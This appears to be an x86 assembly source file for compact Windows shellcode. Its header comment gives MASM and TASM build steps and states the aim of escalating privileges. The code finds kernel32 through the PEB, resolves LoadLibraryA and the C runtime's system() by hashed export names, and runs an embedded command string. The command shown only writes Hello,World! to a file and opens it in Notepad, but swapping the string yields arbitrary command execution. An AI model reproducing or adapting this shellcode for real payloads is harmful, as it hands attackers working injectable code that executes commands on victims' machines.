comment ~
	
	When run, locate "LoadLibraryA" address in KERNEL32.DLL, load MSVCRT.DLL and locate
	address of "system" API, execute command in order to escalate privileges.

	Code is of variable size, depending on command.
	Currently at 159 bytes.
	
	All this does is echo Hello,World! to file hello.txt and open it with notepad. :)
	There is no obfuscation routine.

	Code doesn't terminate until the command which is executed ends also.
	If you want to run on its own, assemble with MASM or TASM

	TASM:
		implib -c -i -o -f import32.lib %SYSTEMROOT%\System32\kernel32.dll
		tasm32 /dTASM /ml /m9 sys_exec.asm
		tlink32 /Tpe /ap sys_exec,,,import32.lib
	
	MASM:
		ml /DMASM /Cp /c /coff /Ic:\masm32\include sys_exec.asm
		link /SUBSYSTEM:CONSOLE /LIBPATH:c:\masm32\lib sys_exec.obj 

	bcom@hushmail.com
	
~

.586
.model flat, stdcall

IFDEF MASM
include <kernel32.inc>
.code
ENDIF

IFDEF TASM
extrn	ExitProcess	:proc
.code
	ret
.data
ENDIF

HASH_CONSTANT	EQU	9

;					macro for generating 16-bit api hashes
hashapi	macro	szApi
	local	dwHash
	dwHash = 0

	forc x, <szApi>
		dwHash = dwHash + "&x"
		dwHash = (dwHash shl HASH_CONSTANT) or (dwHash shr (32-HASH_CONSTANT))
	endm
	dwHash = dwHash and 0ffffh
	dw	dwHash
endm

	assume fs:NOTHING
main:
	mov	eax, end_code-entrypoint
entrypoint:
	mov	eax, fs:[30h]
	mov	eax, [eax + 0ch]
	mov	esi, [eax + 1ch]
	lodsd
	mov	eax, [eax + 08h]
	;---------------------
	call	load_data
	;===========================================
	hashapi <LoadLibraryA>
	db	"MSVCRT",00h,00h
	hashapi <system>
	db	"echo Hello,World! >hello.txt & notepad hello.txt",00h
	;===========================================
load_data:
	pop	ebp
get_one_api:
	xchg	eax, ebx
	movzx	eax, word ptr [ebx + 3ch]
	mov	esi, [eax + ebx + 78h]
	lea	esi, [ebx + esi + 1ch]
	lodsd
	add	eax, ebx
	push	eax
	lodsd
	lea	edi, [eax + ebx]
	lodsd
	add	eax, ebx
	push	eax
	xor	ecx, ecx
load_index:
	mov	esi, [edi + 4 * ecx]
	add	esi, ebx
	xor	eax, eax
	cdq
hash_export:
	lodsb
	add	edx, eax
	rol	edx, HASH_CONSTANT
	dec	eax
	jns	hash_export
	ror	edx, HASH_CONSTANT
	inc	ecx
	cmp	dx, word ptr [ebp]
	jne	load_index
	dec	ecx
	pop	eax
	pop	esi
	movzx	eax,  word ptr[eax + 2 * ecx]
	add	ebx, dword ptr[esi + 4 * eax]
	inc	ebp
	inc	ebp
	push	ebp
	call	ebx
	add	ebp, 08h
	test	eax, eax
	jnz	get_one_api
end_code:
	push	eax
	call	ExitProcess
end	main